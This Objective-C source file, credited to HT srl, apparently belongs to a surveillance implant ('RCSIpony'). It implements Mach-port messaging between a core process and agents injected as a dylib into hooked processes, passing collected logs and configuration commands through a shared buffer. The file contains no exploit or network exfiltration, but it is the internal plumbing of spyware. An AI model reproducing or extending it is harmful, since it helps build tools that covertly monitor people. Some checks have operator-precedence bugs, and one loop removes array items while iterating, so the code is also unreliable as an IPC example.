/*
 * RCSIpony - IPC through machport
 *  since shmget = ENOSYS
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 11/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 * Adapted from RCSMac by Massimo Chiodini on 05/03/2010
 *
 */

#include <sys/mman.h>
#include <sys/msg.h>
#include <fcntl.h>

#import "RCSISharedMemory.h"
#import "RCSICommon.h"

#define DEBUG_
//#define DEBUG_ERRORS
//#define DEBUG_ERRORS_VERBOSE_1

#pragma mark -
#pragma mark Implementation
#pragma mark -

static int testPreviousTime = 0;

// notified by new hooked proc
typedef struct _shMemNewProc
{
#define NEWPROCMAGIC  0xFFFFFFFF
#define NEWPROCPORT   0xCEEFBEFF
  int magic;
  int pid;
} shMemNewProc;

// Callback for incoming message...
CFDataRef coreMessagesHandler(CFMessagePortRef local,
                              SInt32 msgid,
                              CFDataRef data,
                              void *info)
{
  CFStringRef       cfNewPort;
  CFMessagePortRef  new_port = NULL;
  BOOL              bRet = false;
  
  // paranoid...
  if (data == NULL || info == NULL) 
    return NULL;
  
  CFRetain(data);

#ifdef DEBUG
  NSLog(@"%s: msgid %#x recv data len %d", __FUNCTION__, msgid, [data length]);
#endif
  
  RCSISharedMemory  *shMem      = (RCSISharedMemory *)info;
  shMemNewProc      *procBytes  = (shMemNewProc *)CFDataGetBytePtr(data);

  if (msgid == NEWPROCMAGIC && 
      procBytes->magic == NEWPROCPORT) 
    { 
      cfNewPort = CFStringCreateWithFormat(kCFAllocatorDefault, 
                                           0, 
                                           CFSTR("%@_%d"), 
                                           [shMem mFilename], 
                                           procBytes->pid);
      
      new_port  = CFMessagePortCreateRemote(kCFAllocatorDefault, cfNewPort);
      
      if (new_port == NULL) 
        {
#ifdef DEBUG
        NSLog(@"%s: cannot create remote port %@", __FUNCTION__, cfNewPort);
#endif
        }
      else 
        {
        // locked on new command processing by another thread...
        @synchronized(shMem)
          {
            // add to array of machport
            [shMem addPort: new_port];
            
            // duplicate shared memory to new proc...
            [shMem synchronizeShMemToPort: new_port];
          }
        }
      
      CFRelease(cfNewPort);
      CFRelease(new_port);
      
      bRet = true;
    }
  else 
    { 
      NSData *tmpData = [[NSData alloc] initWithBytes: CFDataGetBytePtr(data) 
                                               length: CFDataGetLength(data)];      
      @synchronized(shMem)
      {
        [shMem.mCoreMessageQueue addObject: tmpData];  
      }
      
      [tmpData release];
    }
  
  CFRelease(data);
  
  return NULL;
}

// Callback for incoming message...
CFDataRef shMemCallBack (CFMessagePortRef local,
                         SInt32 msgid,
                         CFDataRef data,
                         void *info)
{
  CFStringRef       cfNewPort;
  CFMessagePortRef  new_port = NULL;
  BOOL              bRet = false;

  // paranoid...
  if (data == NULL || info == NULL) 
    return NULL;
    
  CFRetain(data);
  
  RCSISharedMemory  *shMem      = (RCSISharedMemory *)info;
  shMemNewProc      *procBytes  = (shMemNewProc *)CFDataGetBytePtr(data);

#ifdef DEBUG
  NSLog(@"%s: receive new msg with id 0x%x and info %@, data = 0x%x", __FUNCTION__, msgid, shMem, data);
#endif
  
  if (msgid == NEWPROCMAGIC && 
      procBytes->magic == NEWPROCPORT) 
    { 
#ifdef DEBUG
      NSLog(@"%s: new remote port %@_%d detected!", __FUNCTION__, [shMem mFilename], procBytes->pid);
#endif
      
      cfNewPort = CFStringCreateWithFormat(kCFAllocatorDefault, 
                                           0, 
                                           CFSTR("%@_%d"), 
                                           [shMem mFilename], 
                                           procBytes->pid);
      
      new_port  = CFMessagePortCreateRemote(kCFAllocatorDefault, cfNewPort);
      
      if (new_port == NULL) 
        {
#ifdef DEBUG
          NSLog(@"%s: cannot create remote port %@", __FUNCTION__, cfNewPort);
#endif
        }
      else 
        {
#ifdef DEBUG
          NSLog(@"%s: adding new named port %@ [%x]", __FUNCTION__, cfNewPort, new_port);
#endif
          // locked on new command processing by another thread...
          @synchronized(shMem)
          {
            // add to array of machport
            [shMem addPort: new_port];
        
            // duplicate shared memory to new proc...
            [shMem synchronizeShMemToPort: new_port];
          }
        }
      
      CFRelease(cfNewPort);
      CFRelease(new_port);
      
      bRet = true;
    }
  else 
    {
#ifdef DEBUG
      shMemoryLog *tmp_log = (shMemoryLog *) [(NSData *)data bytes]; 
      NSLog(@"%s: writeMemory for offset 0x%x and log id %x", __FUNCTION__, msgid, tmp_log->logID);
#endif      
      bRet = [shMem writeMemory: (NSData *)data offset: msgid fromComponent: COMP_EXT_CALLB];
    }
  
  CFRelease(data);
  
  return NULL;
}

@implementation RCSISharedMemory

@synthesize mFilename;
@synthesize mSharedMemory;
@synthesize mSize;
@synthesize mCoreMessageQueue;
@synthesize mLogMessageQueue;

// Called by dylib only
- (BOOL)isShMemValid
{
  int i;
  CFMessagePortRef tmp_port;

  for (i=0; i < [mRemotePorts count]; i++) 
    {
      tmp_port = (CFMessagePortRef) [mRemotePorts objectAtIndex: i];

      if (CFMessagePortIsValid(tmp_port) == false)
        {
#ifdef DEBUG
          NSLog(@"%s: machport %x invalid", __FUNCTION__, tmp_port);
#endif
        }
      else 
        return YES;
    }
  
  return NO;
}

- (BOOL)restartShMem
{
  // clean up stuff
  if(mMemPort != NULL)
    {
      CFMessagePortInvalidate(mMemPort);
      CFRelease(mMemPort);
      mMemPort = NULL;
    }  
  
  if (mRLSource != NULL)
    {
      CFRunLoopRemoveSource(CFRunLoopGetCurrent(), mRLSource, kCFRunLoopDefaultMode);
      CFRelease(mRLSource);
      mRLSource = NULL;
    }
  
  // recreate shared mem
  if ([self createMemoryRegionForAgent] == 0)
    return YES;
  else
    return NO;
}

- (void)runMethod: (NSDictionary *)aDict
{
#ifdef DEBUG
  NSLog(@"%s: starting new thread for msg", __FUNCTION__);
#endif
  NSString *methodSel = [aDict objectForKey: @"method"];
  
#ifdef DEBUG
  NSLog(@"%s: running method %@", __FUNCTION__, methodSel);
#endif
  
  if([methodSel compare: @"writeMemory"] == NSOrderedSame)
    {
#ifdef DEBUG
      shMemoryLog *tmp_log = (shMemoryLog *)[(NSData *)[aDict objectForKey: @"param1"] bytes];
      NSLog(@"%s: running method %@ for logID 0x%x", __FUNCTION__, methodSel, tmp_log->logID);
#endif
      [self writeMemory: [[aDict objectForKey: @"param1"] retain]
                 offset: [[aDict objectForKey: @"param2"] intValue]
          fromComponent: COMP_EXT_CALLB];
    
      [[aDict objectForKey: @"param1"] release];
    }
  else if([methodSel compare: @"synchronizeShMemToPort"] == NSOrderedSame)
    {
      [self synchronizeShMemToPort: (CFMessagePortRef)[aDict objectForKey: @"param1"]];
    }
    
    [aDict release];
}

- (id)initWithFilename: (NSString *)aFilename
                  size: (u_int)aSize
{
  if (self = [super init])
    {
      mSize         = aSize;
      mFilename     = aFilename;
      mRemotePorts  = [[NSMutableArray alloc] initWithCapacity: 0];
      mCoreMessageQueue = [[NSMutableArray alloc] initWithCapacity: 0];
      mSharedMemory = NULL;
      mMemPort      = NULL;
      mRLSource     = NULL;
    }
  
  return self;
}

- (void)dealloc
{
  if ([self detachFromMemoryRegion] == 0)
    {
#ifdef DEBUG
      NSLog(@"%s: Succesfully detached from memory", __FUNCTION__);
#endif
    }
  
  if(mMemPort != NULL)
    CFRelease(mMemPort);
  
  if (mRLSource != NULL)
    CFRelease(mRLSource);
  
  [mRemotePorts release];
  
  mMemPort      = NULL;
  mRLSource     = NULL;
  mRemotePorts  = NULL;
  
  [super dealloc];
}

- (int)attachToMemoryRegion: (BOOL)fromScratch
{  
  mSharedMemory = (char *) malloc(mSize);
  
  if (mSharedMemory == NULL) 
    {
#ifdef DEBUG
      NSLog(@"%s: critical error cannot allocate memory region", __FUNCTION__);
#endif
    }
  else 
    {
#ifdef DEBUG
      NSLog(@"%s: mSharedMemory at 0x%x with size 0x%x", __FUNCTION__, mSharedMemory, mSize);
#endif
      memset(mSharedMemory, 0, mSize);
    }
  
  return 0;
}

- (int)detachFromMemoryRegion
{
  int i = 0;
  
  if(mSharedMemory != NULL)
    {
      free(mSharedMemory);
      mSharedMemory = NULL;
    }
  
  if(mMemPort)
    {
#ifdef DEBUG
      NSLog(@"[DYLIB] %s: shared mem releasing mach port", __FUNCTION__);
#endif
      CFRunLoopRemoveSource(CFRunLoopGetCurrent(), mRLSource, kCFRunLoopDefaultMode);
      CFRelease(mRLSource);
      CFMessagePortInvalidate(mMemPort);
      CFRelease(mMemPort);
    }
  
  for (i=0; i < [mRemotePorts count]; i++) 
    {
#ifdef DEBUG
      NSLog(@"[DYLIB] %s: shared mem releasing remote port %d", __FUNCTION__, i);
#endif
      CFMessagePortRef port = (CFMessagePortRef) [mRemotePorts objectAtIndex: i];
      CFMessagePortInvalidate(port);
      CFRelease(port);
    }
  
  return 0;
}

// Core MUST use this to allocate sharedMem objects...
- (int)createMemoryRegion
{
  Boolean bfool = false;
  CFMessagePortContext shCtx;
  
  memset(&shCtx, 0, sizeof(shCtx));
  
  shCtx.info = (void *)self;
  
  mMemPort = CFMessagePortCreateLocal(kCFAllocatorDefault, 
                                      (CFStringRef)mFilename, 
                                      shMemCallBack, 
                                      &shCtx, 
                                      &bfool);
  
  if (mMemPort == NULL) 
    {
#ifdef DEBUG
      NSLog(@"%s: cannot create %@ local port", __FUNCTION__, mFilename);
#endif
      return 1;
    }
  else {
#ifdef DEBUG
      NSLog(@"%s: local port %@ created [%x]", __FUNCTION__, mFilename, mMemPort);
#endif
    }
  
  mRLSource = CFMessagePortCreateRunLoopSource(kCFAllocatorDefault, mMemPort, 0);
  
  CFRunLoopAddSource(CFRunLoopGetCurrent(), mRLSource, kCFRunLoopDefaultMode);

  return 0;
}

// dylib MUST use this to allocate sharedMem objects...
- (int)createMemoryRegionForAgent
{
  CFMessagePortRef      cmdPort, logPort;
  Boolean               bfool = false;
  CFMessagePortContext  shCtx;
  NSString              *shFileName;
  
  if ([self isShMemCmd] == YES )
    {
      shMemNewProc memProc;
    
#ifdef DEBUG
      NSLog(@"[DYLIB] %s: shared mem for command", __FUNCTION__);
#endif
    
      memset(&shCtx, 0, sizeof(shCtx));
      shCtx.info = (void *)self;
      
      shFileName = [[NSString alloc] initWithFormat: @"%@_%d", mFilename, getpid()];
      
#ifdef DEBUG
    NSLog(@"[DYLIB] %s: create command named port %@", __FUNCTION__, shFileName);
#endif
    
      mMemPort = CFMessagePortCreateLocal(kCFAllocatorDefault,  
                                          (CFStringRef)shFileName, 
                                          shMemCallBack, 
                                          &shCtx, 
                                          &bfool);
      
      if (mMemPort == NULL) 
        {
#ifdef DEBUG
          NSLog(@"[DYLIB] %s: cannot create %@ local command port", __FUNCTION__, shFileName);
#endif
          return 1;
        }
      else 
        {
#ifdef DEBUG
          NSLog(@"[DYLIB] %s: local command port created %d", __FUNCTION__, mMemPort);
#endif
        }
    
      mRLSource = CFMessagePortCreateRunLoopSource(kCFAllocatorDefault, mMemPort, 0);
      
      CFRunLoopAddSource(CFRunLoopGetCurrent(), mRLSource, kCFRunLoopDefaultMode);
      
      [shFileName release];
      
      do 
        {
          cmdPort = CFMessagePortCreateRemote(kCFAllocatorDefault, 
                                              (CFStringRef)SH_COMMAND_FILENAME);
        
          if (cmdPort == NULL) 
            {
#ifdef DEBUG
              NSLog(@"[DYLIB] %s: cannot create remote command port %@", __FUNCTION__, cmdPort);
#endif
              sleep(1);
            }
          else 
            {  
#ifdef DEBUG
              NSLog(@"[DYLIB] %s: add remote command port %x", __FUNCTION__, cmdPort);
#endif
              [self addPort: cmdPort];
            }
        } 
      while(cmdPort == NULL);
    
      memProc.magic = NEWPROCPORT;
      memProc.pid   = getpid();
      
      NSData *dataProc = [[NSData alloc] initWithBytes: &memProc 
                                                length: sizeof(memProc)];

#ifdef DEBUG
      NSLog(@"[DYLIB] %s: synchronize remote command port", __FUNCTION__);
#endif
    
      [self synchronizeRemotePorts: dataProc 
                        withOffest: NEWPROCMAGIC];
      
      [dataProc release];
            
    }
  
  if ([self isShMemLog] == YES )
    {
      logPort = CFMessagePortCreateRemote(kCFAllocatorDefault, 
                                          (CFStringRef)SH_LOG_FILENAME);
    
      do
        {
          if (logPort == NULL) 
            {
#ifdef DEBUG
              NSLog(@"[DYLIB] %s: cannot create remote log port %@", __FUNCTION__, logPort);
#endif
              sleep(1);
            }
          else 
            {  
#ifdef DEBUG
              NSLog(@"[DYLIB] %s: add log port %x", __FUNCTION__, logPort);
#endif
              [self addPort: logPort];
            }
        }
      while (logPort == NULL);
    }
  
  return 0;
}

// Array of remote mach port (CORE/AGENTS)
- (void)addPort: (CFMessagePortRef)port
{
  [mRemotePorts addObject: (id)port];
}

// Whoami method...
- (BOOL)isShMemLog
{
  if ([mFilename compare: SH_LOG_FILENAME] == NSOrderedSame) 
    return YES;
  else 
    return NO;
}

- (BOOL)isShMemCmd
{
  if ([mFilename compare: SH_COMMAND_FILENAME] == NSOrderedSame) 
    return YES;
  else 
    return NO;
}

- (BOOL)synchronizeRemotePorts: (NSData *)data 
                    withOffest: (u_int)anOffset
{
  CFMessagePortRef  tmp_port;
  int               i = 0;
  BOOL              bRet = NO;
  
#ifdef DEBUG
  NSLog(@"%s: num of remote machport %d", __FUNCTION__, [mRemotePorts count]);
#endif
  
  for (i=0; i < [mRemotePorts count]; i++)
    {
      tmp_port = (CFMessagePortRef) [mRemotePorts objectAtIndex: i];
    
      // cleaning procedure
      if (CFMessagePortIsValid(tmp_port) == false)
        {
#ifdef DEBUG
          NSLog(@"%s: machport %x invalid, removing", __FUNCTION__, tmp_port);
#endif
          CFMessagePortInvalidate(tmp_port);
          [mRemotePorts removeObjectAtIndex: i];
        
          continue;
        }
    
      [self synchronizeRemotePort: tmp_port
                       withOffset: anOffset
                          andData: data];
      bRet = YES;
    }
  
  return bRet;
}

- (void)synchronizeRemotePort: (CFMessagePortRef)port
                   withOffset: (u_int)aOffset
                      andData: (NSData *)aData
{
  CFDataRef retData   = NULL;
  SInt32 sndRet;
  
  if (port == NULL)
    return;
  
  sndRet = CFMessagePortSendRequest(port, 
                                   aOffset, 
                                   (CFDataRef)aData, 
                                   0.5, 
                                   0.5, 
                                   kCFRunLoopDefaultMode, 
                                   &retData);

  if (sndRet == kCFMessagePortSuccess) 
    {
#ifdef DEBUG
      NSLog(@"%s: data send to machport correctly", __FUNCTION__);
#endif
    } 
  else 
    {
#ifdef DEBUG
      NSLog(@"%s: data send to machport error", __FUNCTION__);
#endif
    }
}

- (void)synchronizeShMemToPort: (CFMessagePortRef)port
{
  char  *memBytes = (char *)mSharedMemory;
  int   offset    = 0x40;
  int   disp      = [self isShMemLog] == YES ? sizeof(shMemoryLog) : sizeof(shMemoryCommand);
  
  if( CFMessagePortIsValid(port) == false)
    {
#ifdef DEBUG
      NSLog(@"%s: machport %d is invalid!", __FUNCTION__);
#endif
      return;
    }
  
  do 
    {
#ifdef DEBUG
      //NSLog(@"%s: chunk at 0x%x = 0x%x", __FUNCTION__, memBytes + offset, *(memBytes + offset));
#endif
      // AGENTID low byte != 0!!
      if (*(memBytes + offset) != SHMEM_FREE) 
        {
          NSData *aData = [[NSData alloc] initWithBytes: memBytes + offset 
                                                 length: disp];
#ifdef DEBUG
          NSLog(@"%s: found shared mem struct at offset 0x%x [0x%x], synchronizing...", 
                __FUNCTION__, offset, *(int *)(memBytes + offset));
#endif
          [self synchronizeRemotePort: port 
                           withOffset: offset 
                              andData: aData];
                  
          [aData release];
        }
      
      offset += disp;
    
    } 
  while (offset < mSize);
  
}

- (void)zeroFillMemory
{
  bzero(mSharedMemory, mSize);
}

- (BOOL)clearConfigurations
{
  u_int offset              = 0;
  shMemoryLog *memoryHeader = NULL;
  
  if (mSize < SHMEM_LOG_MAX_SIZE)
    {
#ifdef DEBUG_ERRORS
      NSLog(@"%s:[EE] clearConfigurations can't be used on the command queue", __FUNCTION__);
#endif      
      return FALSE;
    }
  
  do
    {
      memoryHeader        = (shMemoryLog *)(mSharedMemory + offset);
      int tmpAgentID      = memoryHeader->agentID;
      int tmpCommandType  = memoryHeader->commandType;
      
      if (tmpAgentID != 0
          && tmpCommandType == CM_AGENT_CONF)
        {
          memset((void *)(mSharedMemory + offset), '\0', sizeof(shMemoryLog));
        }
      else
        {
          // Not found
          offset += sizeof (shMemoryLog);
        }
    }
  while (offset < SHMEM_LOG_MAX_SIZE);
  
  // execute clearConfiguration on remote port
  // ....
  
  return TRUE;
}

- (NSMutableData *)readMemory: (u_int)anOffset
                fromComponent: (u_int)aComponent
{
  NSMutableData *readData       = nil;
  
  // this is for log shared mem on dylib
  if (mSharedMemory == NULL) 
    return nil;
  
  shMemoryCommand *memoryHeader = (shMemoryCommand *)(mSharedMemory + anOffset);
  
  if (aComponent != COMP_CORE && aComponent != COMP_AGENT)
    {
#ifdef DEBUG_ERRORS_VERBOSE_1
      NSLog(@"%s: [EE] readMemory-command unsupported component", __FUNCTION__);
#endif
      return nil;
    }
  
  if (anOffset == 0)
    {
#ifdef DEBUG_ERRORS_VERBOSE_1
      NSLog(@"%s: [EE] readMemory-command offset is zero", __FUNCTION__);
#endif
      return nil;
    }
  
  if (memoryHeader->agentID != 0)
    {
      //
      // Now if who is reading is the same as who this data is directed to,
      // read it and clean out the area
      //
      if (aComponent ^ memoryHeader->direction == 0)
        {
          readData = [[NSMutableData alloc] initWithBytes: mSharedMemory + anOffset
                                                   length: sizeof(shMemoryCommand)];
#ifdef DEBUG
          NSLog(@"%s: Found data at shared memory offset 0x%x", __FUNCTION__, anOffset);
#endif
        }
    }
  
  return readData;
}

- (NSMutableData *)readMemoryFromComponent: (u_int)aComponent
                                  forAgent: (u_int)anAgentID
                           withCommandType: (u_int)aCommandType
{
  NSMutableData *readData = nil;
  shMemoryLog *tempHeader = NULL;
  
  BOOL lookForAgent       = NO;
  BOOL foundAgent         = NO;
  BOOL lookForCommand     = NO;
  BOOL foundCommand       = NO;
  BOOL blockFound         = NO;
  BOOL blockMatched       = NO;
  
  u_int offset            = 0;
  
  if (mSharedMemory == NULL) 
    return nil;
  
  if (aComponent != COMP_CORE && aComponent != COMP_AGENT)
    {
#ifdef DEBUG_ERRORS_VERBOSE_1
      NSLog(@"%s: [EE] readMemory-log unsupported component", __FUNCTION__);
#endif
      return nil;
    }
  
  if (anAgentID == 0 && aCommandType == 0)
    {
#ifdef DEBUG_ERRORS_VERBOSE_1
      NSLog(@"%s: [EE] readMemory-log usupported read", __FUNCTION__);
#endif
    }
  
  if (aCommandType != 0)
    {
      lookForCommand = YES;
    }
  if (anAgentID != 0)
    {
      lookForAgent = YES;
    }
  
  // for a good marking of log chunks we need usec too
  int64_t lowestTimestamp      = 0;
  u_int   matchingObjectOffset = 0;
  
  //
  // Find the first available block who matches our request
  //
  do
    {
      tempHeader          = (shMemoryLog *)(mSharedMemory + offset);
      int tempState       = tempHeader->status;
      int tmpAgentID      = tempHeader->agentID;
      int tmpCommandType  = tempHeader->commandType;
      int tmpDirection    = tempHeader->direction;
    
      if (tempState == SHMEM_FREE)
        {
          offset += sizeof (shMemoryLog);
          continue;
        }
    
      if (tempState == SHMEM_LOCKED)
        {
#ifdef DEBUG_ERRORS
          NSLog(@"%s: ANOMALY! FOUND LOCKED BLOCK ON READ", __FUNCTION__);
#endif
        }
    
      if (lookForCommand == YES)
        {
          if (((aCommandType & tmpCommandType) == tmpCommandType) &&  tmpCommandType != 0)
            {
              foundCommand = YES;
            }
        }
    
      if (lookForAgent == YES)
        {
          if (tmpAgentID == anAgentID)
            {
              foundAgent = YES;
            }
        }
    
      // Looking only for commandType
      if ((lookForCommand == YES && foundCommand == YES) && lookForAgent == NO)
        blockFound = YES;
    
      // Looking only for agentID
      if ((lookForAgent     == YES && foundAgent == YES) && lookForCommand == NO)
        blockFound = YES;
    
      // Looking for both
      if ((lookForCommand  == YES && foundCommand == YES) && 
          (lookForAgent == YES && foundAgent == YES))
        blockFound = YES;
    
      if (blockFound == YES)
        {
          if (tmpDirection ^ aComponent == 0)
            {
#ifdef DEBUG_VERBOSE_1
              NSLog(@"%s: [ii] Found data matching our request on shmem" __FUNCTION__);
#endif
              blockMatched = YES;
            
              if (lowestTimestamp == 0)
                {
                  lowestTimestamp  = tempHeader->timestamp;
                  matchingObjectOffset = offset;
                }
              else if (tempHeader->timestamp < lowestTimestamp)
                {
                  lowestTimestamp  = tempHeader->timestamp;
                  matchingObjectOffset = offset;
                }
              }
        }
      
      offset += sizeof (shMemoryLog);
      
      foundCommand = NO;
      foundAgent   = NO;
      blockFound   = NO;
    }
  while (offset < SHMEM_LOG_MAX_SIZE);
  
  if (blockMatched == YES)
    {    
      if (testPreviousTime != 0)
        {
        if (lowestTimestamp < testPreviousTime)
          {
#ifdef DEBUG_ERRORS
            NSLog(@"%s: ANOMALY DETECTED in shared memory!", __FUNCTION__);
            NSLog(@"%s: previousTimestamp: %x", __FUNCTION__, testPreviousTime);
            NSLog(@"%s: lowestTimestamp  : %x", __FUNCTION__, lowestTimestamp);
#endif
          }
        }
    
      testPreviousTime = lowestTimestamp;
      
      readData = [[NSMutableData alloc] initWithBytes: (char *)(mSharedMemory + matchingObjectOffset)
                                               length: sizeof(shMemoryLog)];
      
#ifdef DEBUG
      shMemoryLog *tmp_log = (shMemoryLog *)(mSharedMemory + matchingObjectOffset);
      NSLog(@"%s: log with logID 0x%x offset 0x%x[%qu]", 
            __FUNCTION__, tmp_log->logID, matchingObjectOffset, tmp_log->timestamp);
#endif
      
      if (aCommandType != CM_AGENT_CONF)
        {
          memset((char *)(mSharedMemory + matchingObjectOffset), 0, sizeof(shMemoryLog));
        }
    }
  else
    {
      return nil;
    }
    
  return readData;
}

- (BOOL)writeMemory: (NSData *)aData
             offset: (u_int)anOffset
      fromComponent: (u_int)aComponent
{
  int memoryState = 0;
  BOOL bRet       = NO;
  
  //
  // In case we receive 0 as offset it means that we're dealing within the logs
  // shared memory, thus we need to find the first available block (not written)
  //
  if (anOffset == 0 || anOffset == 1)
    {
      // for log shared mem on dylib
      if (mSharedMemory != NULL)
        {
          if (anOffset == 1)
            {
              [self zeroFillMemory]; 
              anOffset = 0;
            }
        
          do
            {
              memoryState = *(unsigned int *)(mSharedMemory + anOffset);
              
              if (memoryState != SHMEM_FREE)
                {
                  anOffset += sizeof (shMemoryLog);
                }
              else
                {
                  memoryState = SHMEM_LOCKED;
                  break;
                }
              
              if (anOffset >= SHMEM_LOG_MAX_SIZE)
                {
#ifdef DEBUG_ERRORS
                  NSLog(@"%s: [EE] SHMem - write didn't found an available memory block", __FUNCTION__);
#endif        
                  return FALSE;
                }
            }
          while (memoryState != SHMEM_FREE);

#ifdef DEBUG
          shMemoryLog *tmp_log = (shMemoryLog *)[aData bytes];
          NSLog(@"%s: memcpy buffer for logID 0x%x offset 0x%x [%qu]", 
                __FUNCTION__, tmp_log->logID, anOffset, tmp_log->timestamp);
#endif
          // copy buffer without status
          memcpy((void *)(mSharedMemory + anOffset) + sizeof(u_int), 
                 [aData bytes] + sizeof(u_int), 
                 [aData length] - sizeof(u_int));
        
          *(unsigned int *)(mSharedMemory + anOffset) = SHMEM_WRITTEN;
        
        
#ifdef DEBUG
        NSLog(@"%s: writing %d bytes for logs at offset %x", __FUNCTION__, [aData length], anOffset);
#endif          
          bRet = YES;
        }
    
      if (aComponent == COMP_AGENT)  
        {
#ifdef DEBUG
          NSLog(@"%s: synchronize remote log port for agent at offset %x", __FUNCTION__, anOffset);
#endif
          bRet = [self synchronizeRemotePorts: aData withOffest: anOffset];
        }

    }
  else
    {
      // Command syncronization locked only if we've received new not synched machport
      @synchronized(self)
      {
        if (mSharedMemory != NULL) 
          {
#ifdef DEBUG
            NSLog(@"%s: writing %d bytes for command at offset %x", __FUNCTION__, [aData length], anOffset);
#endif
            memcpy((void *)(mSharedMemory + anOffset), [aData bytes], [aData length]);
            bRet = YES;
          }
    
        if (aComponent == COMP_CORE)
          {
#ifdef DEBUG
            NSLog(@"%s: synchronize remote command port for core at offset %x", __FUNCTION__, anOffset);
#endif
            // XXX: this may fail if there's no other process running to sync with
            [self synchronizeRemotePorts: aData withOffest: anOffset];
            
            bRet = YES;
          }
      }
    }
  
#ifdef DEBUG_VERBOSE_2
  for (int x = 0; x < [aData length]; x += sizeof(int))
    NSLog(@"Data sent: %08x", *(unsigned int *)(mSharedMemory + anOffset + x));
#endif
  
  return bRet;
}

////////////////////////////////////////////////////////////////

// Core MUST use this to allocate sharedMem objects...
- (int)createCoreRLSource
{
  Boolean bfool = false;
  CFMessagePortContext shCtx;
  
  memset(&shCtx, 0, sizeof(shCtx));
  
  shCtx.info = (void *)self;
  
  mMemPort = CFMessagePortCreateLocal(kCFAllocatorDefault, 
                                      (CFStringRef)mFilename, 
                                      coreMessagesHandler, 
                                      &shCtx, 
                                      &bfool);
  
  if (mMemPort == NULL) 
    {
#ifdef DEBUG
      NSLog(@"%s: cannot create %@ local port", __FUNCTION__, mFilename);
#endif
      return 1;
    }
  
  mRLSource = CFMessagePortCreateRunLoopSource(kCFAllocatorDefault, mMemPort, 0);
  
  CFRunLoopAddSource(CFRunLoopGetCurrent(), mRLSource, kCFRunLoopDefaultMode);
  
  return 0;
}

- (NSMutableArray*)fetchMessages
{
  NSMutableArray *tmpQueue;
  
  tmpQueue = [[[NSMutableArray alloc] initWithCapacity:0] autorelease];
  
  @synchronized(self)
  {
    tmpQueue = [[mCoreMessageQueue copy] autorelease];
    [mCoreMessageQueue removeAllObjects];
  }
  
  return tmpQueue;
}

@end